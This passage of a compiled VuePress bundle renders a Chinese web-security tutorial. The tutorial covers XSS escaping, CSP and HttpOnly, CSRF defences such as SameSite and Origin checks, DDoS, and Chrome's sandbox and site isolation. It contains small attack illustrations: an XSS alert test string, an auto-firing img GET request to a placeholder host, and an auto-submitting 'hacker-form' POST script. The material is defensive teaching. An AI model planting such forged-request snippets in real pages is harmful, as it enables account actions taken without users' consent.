regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("'")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&#39;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("`")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&#96;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("\\/")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&#x2F;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("ul",[a("li",[t._v("白名单")])]),t._v(" "),a("div",{staticClass:"language-JavaScript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" xss "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("require")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"xss"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("let")]),t._v(" html "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("xss")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'<h1 id="title">XSS Demo</h1><script>alert("xss");<\/script>\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;')]),t._v("\n")])])])])]),t._v(" "),a("ol",{attrs:{start:"2"}},[a("li",[a("strong",[t._v("充分利用 CSP")]),t._v("\nCSP 有如下几个功能：")])]),t._v(" "),a("ul",[a("li",[t._v("限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；")]),t._v(" "),a("li",[t._v("禁止向第三方域提交数据，这样用户数据也不会外泄；")]),t._v(" "),a("li",[t._v("禁止执行内联脚本和未授权的脚本；")]),t._v(" "),a("li",[t._v("还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。")])]),t._v(" "),a("div",{staticClass:"language-JavaScript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 只允许加载本站资源")]),t._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("default")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'self'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 只允许加载 HTTPS 协议图片")]),t._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" img"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src https"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/*\n// 不允许加载任何来源框架\nContent-Security-Policy: child-src 'none'\n")])])])]),a("ol",{attrs:{start:"3"}},[a("li",[a("strong",[t._v("使用 HttpOnly 属性")])])]),t._v(" "),a("p",[t._v("由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。")]),t._v(" "),a("div",{staticClass:"language-node extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");\n')])])]),a("h2",{attrs:{id:"csrf-攻击-陌生链接不要随便点"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf-攻击-陌生链接不要随便点"}},[t._v("#")]),t._v(" CSRF 攻击：陌生链接不要随便点")]),t._v(" "),a("p",[t._v("CSRF 英文全称是"),a("strong",[t._v("Cross-site request forgery")]),t._v(",所以又称为“ "),a("strong",[t._v("跨站请求伪造")]),t._v(" ”，是指黑客引\n诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，\n"),a("strong",[t._v("CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。")])]),t._v(" "),a("h3",{attrs:{id:"自动发起-get-请求"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#自动发起-get-请求"}},[t._v("#")]),t._v(" 自动发起 GET 请求")]),t._v(" "),a("p",[t._v("当页面被加载时，浏览器会自动发起资源请求")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("https://xxxx.com/session?user=xxx&psw=xxx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n")])])]),a("h3",{attrs:{id:"自动发起-post-请求"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#自动发起-post-请求"}},[t._v("#")]),t._v(" 自动发起 POST 请求")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hacker-form"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n  document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("getElementById")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"hacker-form"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("submit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("通过表单自动提交 POST 请求")]),t._v(" "),a("h3",{attrs:{id:"引诱客户点击链接"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#引诱客户点击链接"}},[t._v("#")]),t._v(" 引诱客户点击链接")]),t._v(" "),a("h3",{attrs:{id:"如何防止-csrf-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何防止-csrf-攻击"}},[t._v("#")]),t._v(" 如何防止 CSRF 攻击")]),t._v(" "),a("p",[t._v("发起 "),a("code",[t._v("CSRF")]),t._v(" 攻击的三个必要条件：")]),t._v(" "),a("ul",[a("li",[t._v("第一个，目标站点一定要有 "),a("code",[t._v("CSRF")]),t._v(" 漏洞；")]),t._v(" "),a("li",[t._v("第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；")]),t._v(" "),a("li",[t._v("第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。")])]),t._v(" "),a("p",[t._v("要避免发生 "),a("code",[t._v("CSRF 攻击")]),t._v("，通常有以下几种途径：")]),t._v(" "),a("ol",[a("li",[a("strong",[t._v("充分利用好 "),a("code",[t._v("Cookie")]),t._v(" 的 "),a("code",[t._v("SameSite")]),t._v(" 属性")])])]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("Strict")]),t._v(" 最为严格。如果 SameSite 的值是 Strict,那么浏览器会完全禁止第三方 Cookie。")]),t._v(" "),a("li",[a("strong",[t._v("Lax")]),t._v(" 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get\n方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通\n过 img、iframe 等标签加载的 URL,这些场景都不会携带 Cookie。")]),t._v(" "),a("li",[t._v("而如果使用 "),a("strong",[t._v("None")]),t._v(" 的话，在任何情况下都会发送 Cookie 数据。")])]),t._v(" "),a("ol",{attrs:{start:"2"}},[a("li",[a("strong",[t._v("验证请求的来源站点")])])]),t._v(" "),a("p",[t._v("服务器的策略是优先判断 "),a("strong",[t._v("Origin")]),t._v(",如果请求头中没有包含 "),a("code",[t._v("Origin")]),t._v(" 属性，再根据实际情\n况判断是否使用 "),a("strong",[t._v("Referer")]),t._v(" 值。\nOrigin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin\n和 Referer 的一个主要区别。\n在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。")]),t._v(" "),a("ol",{attrs:{start:"3"}},[a("li",[a("strong",[t._v("CSRF Toekn")]),t._v("\n服务器生成一个随机字符串，在之后的请求都携带上")])]),t._v(" "),a("h2",{attrs:{id:"ddos-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ddos-攻击"}},[t._v("#")]),t._v(" DDOS 攻击")]),t._v(" "),a("p",[t._v("DDOS 攻击指的是所有使服务器崩溃的手段")]),t._v(" "),a("p",[t._v("常见的有：")]),t._v(" "),a("ul",[a("li",[t._v("高并发请求")]),t._v(" "),a("li",[t._v("SYN Flood")]),t._v(" "),a("li",[t._v("HTTP Flood")]),t._v(" "),a("li",[t._v("...等等")])]),t._v(" "),a("p",[t._v("防范手段：")]),t._v(" "),a("ul",[a("li",[t._v("备份网站")]),t._v(" "),a("li",[t._v("使用阿里云等运营商服务器")]),t._v(" "),a("li",[t._v("带宽扩容+CDN 增加攻击成本")])]),t._v(" "),a("h2",{attrs:{id:"安全沙箱"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安全沙箱"}},[t._v("#")]),t._v(" 安全沙箱")]),t._v(" "),a("p",[t._v("安全沙箱，就是将渲染进程和操作系统隔离的一道墙，由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。")]),t._v(" "),a("p",[t._v("我们知道安全沙箱"),a("strong",[t._v("最小的保护单位是进程")]),t._v("，并且能限制进程对操作系统资源的访问和修改，这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。")]),t._v(" "),a("img",{staticStyle:{zoom:"80%"},attrs:{src:"https://i.loli.net/2021/03/02/LMlKcvWGIAmSeUD.png",alt:"image-20200612160419524"}}),t._v(" "),a("h3",{attrs:{id:"持久存储"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#持久存储"}},[t._v("#")]),t._v(" 持久存储")]),t._v(" "),a("p",[t._v("具体地讲，如下文件内容的读写都是在浏览器内核中完成的：")]),t._v(" "),a("ul",[a("li",[t._v("存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据\n库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取\nCookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进\n程。")]),t._v(" "),a("li",[t._v("一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。")])]),t._v(" "),a("h3",{attrs:{id:"网络访问"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络访问"}},[t._v("#")]),t._v(" 网络访问")]),t._v(" "),a("p",[t._v("同样有了安全沙箱的保护，在渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL,比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。")]),t._v(" "),a("h3",{attrs:{id:"用户交互"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#用户交互"}},[t._v("#")]),t._v(" 用户交互")]),t._v(" "),a("p",[t._v("通常情况下，如果你要实现一个 UI 程序，操作系统会提供一个界面给你，该界面允许应用程序与用户交互，允许应用程序在该界面上进行绘制，比如 Windows 提供的是 HWND,Linux 提供的 XWindow,我们就把"),a("code",[t._v("HWND")]),t._v("和"),a("code",[t._v("XWindow")]),t._v("统称为"),a("strong",[t._v("窗口句柄")]),t._v("。应用程序可以在窗口\n句柄上进行绘制和接收键盘鼠标消息。")]),t._v(" "),a("p",[t._v("渲染进程不能直接访问窗口句柄，所以渲染进程需要完成以下两点大的改变。\n第一点，"),a("strong",[t._v("渲染进程需要渲染出位图")]),t._v("。为了向用户显示渲染进程渲染出来的位图，渲染进程需要将生成好的位图发送到浏览器内核，然后浏览器内核将位图复制到屏幕上。\n第二点，"),a("strong",[t._v("操作系统没有将用户输入事件直接传递给渲染进程，而是将这些事件传递给浏览器内核")]),t._v("。然后浏览器内核再根据当前浏览器界面的状态来判断如何调度这些事件，如果当前焦点位于浏览器地址栏中，则输入事件会在浏览器内核内部处理；如果当前焦点在页面的区域内，则浏览器内核会将输入事件转发给渲染进程。")]),t._v(" "),a("h3",{attrs:{id:"站点隔离-site-isolation"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#站点隔离-site-isolation"}},[t._v("#")]),t._v(" 站点隔离（Site Isolation)")]),t._v(" "),a("p",[t._v("所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关联的页面放到同一个渲染进程中执行。")]),t._v(" "),a("p",[t._v("最开始 Chrome 划分渲染进程是以标签页为单位，也就是说整个标签页会被划分给某个渲染进程。但是，按照标签页划分渲染进程存在一些问题，原因就是一个标签页中可能包含了多个"),a("code",[t._v("iframe")]),t._v(",而这些"),a("code",[t._v("iframe")]),t._v("又有可能来自于不同的站点，这就导致了多个不同站点中的内容通过"),a("code",[t._v("iframe")]),t._v("同时运行在同一个渲染进程中。")]),t._v(" "),a("p",[t._v("因此 Chrome 几年前就开始重构代码，将标签级的渲染进程重构为 iframe 级的渲染进程，然后严格按照同一站点的策略来分配渲染进程，这就是 Chrome 中的站点隔离。\n实现了站点隔离，就可以将恶意的 iframe 隔离在恶意进程内部，使得它无法继续访问其他 iframe 进程的内容，因此也就无法攻击其他站点了。")]),t._v(" "),a("h4",{attrs:{id:"为什么要让他们跑在一个进程里面呢"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#为什么要让他们跑在一个进程里面呢"}},[t._v("#")]),t._v(" 为什么要让他们跑在一个进程里面呢？")]),t._v(" "),a("p",[t._v("因为在一个渲染进程里面，他们就会共享 JS 的执行环境，也就是说 A 页面可以直接在 B 页面中执行脚本。因为是同一家的站点，所以是有这个需求的。")])])}),[],!1,null,null,null);s.default=r.exports}}]);